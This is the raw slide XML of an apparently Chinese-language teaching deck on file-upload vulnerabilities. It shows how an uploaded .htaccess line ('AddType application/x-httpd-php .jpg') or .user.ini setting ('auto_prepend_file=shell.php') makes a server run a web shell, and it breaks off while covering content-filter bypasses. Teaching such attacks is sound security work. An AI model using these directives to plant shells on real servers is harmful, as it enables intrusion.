                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              </a:rPr>
              <a:t>利用</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" b="1">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="文本框 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="669925" y="2196782"/>
            <a:ext cx="5080000" cy="2338070"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1"/>
              <a:t>配置文件</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>是用来控制 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600"/>
              <a:t>Web </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>服务器运行规则的文件。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>它可以决定：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" panose="020B0604020202020204"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>哪些文件可以访问</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" panose="020B0604020202020204"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>哪些文件会被当作程序执行</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" panose="020B0604020202020204"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>某个目录允许执行什么类型的脚本</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" panose="020B0604020202020204"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>简单理解：配置文件 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>= </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>服务器的运行规则</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" b="1">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>服务器在处理请求时，会读取这些规则并按照规则执行。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="文本框 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6231255" y="1963420"/>
            <a:ext cx="5080000" cy="3692525"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>如果网站允许用户上传文件，而服务器又会读取目录中的配置文件，那么攻击者就可能：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>1.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>上传恶意配置文件</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>2.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>修改服务器的执行规则</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>3.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>让原本不能执行的文件被执行</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>例如：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>图片文件 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>.jpg</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>原本只会被当作图片显示</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>但如果修改配置规则：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>.jpg </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>也可以当作 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>PHP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>脚本执行</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绕过技巧</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="灯片编号占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:p>
            <a:fld id="{5DD3DB80-B894-403A-B48E-6FDC1A72010E}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="文本框 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="805815" y="1503045"/>
            <a:ext cx="2374265"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en-US" altLang="zh-CN" sz="2400" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              </a:rPr>
              <a:t>.htaccess </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              </a:rPr>
              <a:t>文件</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" b="1">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="文本框 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="805815" y="2197100"/>
            <a:ext cx="4631055" cy="922020"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1"/>
              <a:t>.htaccess </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>是 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>Apache </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>服务器的一种目录级配置文件。如果服务器允许上传</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t> .htaccess </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>文件，攻击者可以修改服务器的解析规则。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="文本框 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="805815" y="3187383"/>
            <a:ext cx="5080000" cy="1476375"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>例如在 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>.htaccess </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>中写入：</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="zh-CN" altLang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>AddType application/x-httpd-php .jpg</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="zh-CN" b="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US" altLang="zh-CN">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>这条规则表示：</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>把</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> .jpg </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>文件当作</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> PHP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>脚本执行</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" b="1">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="文本框 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="805815" y="4732338"/>
            <a:ext cx="5080000" cy="1476375"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>攻击流程：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>上传 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>.htaccess</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>修改服务器解析规则</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>上传 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>shell.jpg</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>访问 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>shell.jpg </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>执行代码</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="文本框 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7769860" y="1503045"/>
            <a:ext cx="2061845"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en-US" altLang="zh-CN" sz="2400" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              </a:rPr>
              <a:t>.user.ini </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              </a:rPr>
              <a:t>文件</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" b="1">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="文本框 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7080250" y="2183765"/>
            <a:ext cx="4345940" cy="645160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>.user.ini </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>是 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>PHP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>的一种配置文件。作用是用于修改 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>PHP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>在某个目录中的运行配置。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="文本框 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7080250" y="3008947"/>
            <a:ext cx="5080000" cy="1476375"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>例如在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>.user.ini</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>中写入：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>auto_prepend_file=shell.php</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="zh-CN"/>
            </a:br>
            <a:br>
              <a:rPr lang="en-US" altLang="zh-CN"/>
            </a:br>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>含义是：</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>在执行任何</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> PHP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>文件之前都会先加载</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>shell.ph</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>p</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" b="1">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="文本框 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7112000" y="4663758"/>
            <a:ext cx="5080000" cy="1476375"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>攻击流程：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>上传 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>.user.ini</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>设置 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>auto_prepend_file</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>上传恶意 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>PHP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>文件</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>当访问网站时，恶意代码自动执行</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绕过技巧</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="灯片编号占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:p>
            <a:fld id="{5DD3DB80-B894-403A-B48E-6FDC1A72010E}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="文本框 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="805815" y="1503045"/>
            <a:ext cx="1748155"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zh-CN" altLang="en-US" sz="2400" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              </a:rPr>
              <a:t>文件头验证</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" b="1">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="文本框 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="805815" y="1503045"/>
            <a:ext cx="2070735"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zh-CN" altLang="en-US" sz="2400" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              </a:rPr>
              <a:t>文件内容</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              </a:rPr>
              <a:t>过滤</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" b="1">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="文本框 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="805815" y="2197100"/>
            <a:ext cx="5389245" cy="3415030"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>过滤了</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>&lt;?php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>1.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
